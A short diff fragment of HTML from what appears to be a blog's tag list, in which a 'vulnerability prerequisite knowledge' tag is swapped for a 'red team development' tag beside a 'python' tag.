+                        <span class="chip bg-color">python</span>
                     </a>
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/">
-                        <span class="chip bg-color">漏洞前置知识</span>
+                    <a href="/tags/%E7%BA%A2%E9%98%9F%E5%BC%80%E5%8F%91/">
+                        <span class="chip bg-color">红队开发</span>
                     </a>
                     
                 </div>
